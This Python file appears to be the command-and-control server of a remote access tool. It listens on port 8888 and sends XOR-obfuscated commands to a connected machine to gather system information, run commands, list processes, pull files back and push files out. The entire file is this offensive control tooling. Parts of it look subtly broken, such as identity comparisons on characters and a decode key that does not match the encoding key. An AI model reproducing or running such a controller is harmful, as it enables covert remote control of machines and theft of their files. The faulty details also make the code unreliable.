import os
import socket
import time

from prompt_toolkit import prompt
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.history import FileHistory
from prompt_toolkit.validation import Validator


def recv_all(sock, timeout=1):
    sock.setblocking(0)
    buff_size = 4096
    data = bytearray()
    begin = time.time()
    while True:
        if data and time.time() - begin > timeout:
            break
        try:
            part = sock.recv(buff_size)
            if part:
                data.extend(part)
            else:
                time.sleep(0.1)
        except:
            pass
    return data


def receive_file():
    pass


def send_file():
    pass


mainCommandsDict = {
    "SYSINFO": None,
    "RUN": None,
    "LISTPROC": None,
    "PULL": None,
    "PUSH": None
}


def is_valid_main(text):
    d = mainCommandsDict
    if text.strip() == '':
        return True
    for word in text.strip().split(' '):
        if d is not None:
            if word not in d:
                return False
            else:
                d = d[word]
        elif d is None:
            break
    return True


def decode(s, k):
    out = ''
    s = s.decode('utf-8')
    for c in s:
        if ord(c) is not 0x00 and c is not k:
            out += chr(ord(c) ^ ord(k))
        else:
            out += c
    out += '\x00'
    return out


def encode(s):
    out = ''
    for c in s:
        if ord(c) is not 0x00 and ord(c) is not 0x18:
            out += chr(ord(c) ^ 0x18)
        else:
            out += c
    out += '\x00'
    return out


def main():
    completer = NestedCompleter.from_nested_dict(
        mainCommandsDict
    )

    validator_main = Validator.from_callable(
        is_valid_main,
        error_message="Invalid command",
        move_cursor_to_end=True,
    )

    try:
        server_addr = ('', 8888)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind(server_addr)
            sock.listen(1)
            print('Listening')
            connection, client_addr = sock.accept()
            while True:
                user_input = prompt(u' > ',
                                    history=FileHistory('history.txt'),
                                    validator=validator_main,
                                    completer=completer,
                                    )
                while len(user_input.strip()) == 0:
                    user_input = prompt(u' > ',
                                        history=FileHistory('history.txt'),
                                        validator=validator_main,
                                        completer=completer,
                                        )
                if user_input.strip().split(' ')[0] == 'PULL':
                    if len(user_input.strip().split(' ')) != 3:
                        print('USAGE: PULL <remote file> <local save location> ')
                        continue
                    try:
                        _, remote, local = user_input.split(' ')
                        command, _ = user_input.rsplit(' ', 1)
                        command = encode(command)
                        connection.send(command.encode('utf-8'))
                        with open(local, 'wb') as f:
                            file = recv_all(connection)
                            f.write(file)
                    except FileNotFoundError:
                        print(f'Can\'t find file {local}')
                        continue
                elif user_input.strip().split(' ')[0] == 'PUSH':
                    if len(user_input.strip().split(' ')) != 3:
                        print('USAGE: PUSH <remote save location> <local file> ')
                        continue
                    try:
                        _, remote, local = user_input.split(' ')
                        command, _ = user_input.rsplit(' ', 1)
                        command = encode(command)
                        connection.send(command.encode('utf-8'))
                        with open(local, 'rb') as f:
                            part = f.read(1024)
                            while part:
                                connection.send(part)
                                part = f.read(1024)

                    except FileNotFoundError:
                        print(f'Can\'t find file {local}')
                        continue
                else:
                    k = user_input[0]
                    user_input = encode(user_input)
                    connection.send(user_input.encode('utf-8'))
                    time.sleep(.1)
                    data = recv_all(connection)
                    data = decode(data, k)
                    print(data)
                    print()
    except (KeyboardInterrupt, ConnectionResetError):
        print('Shutting down')
        exit(0)


if __name__ == '__main__':
    main()
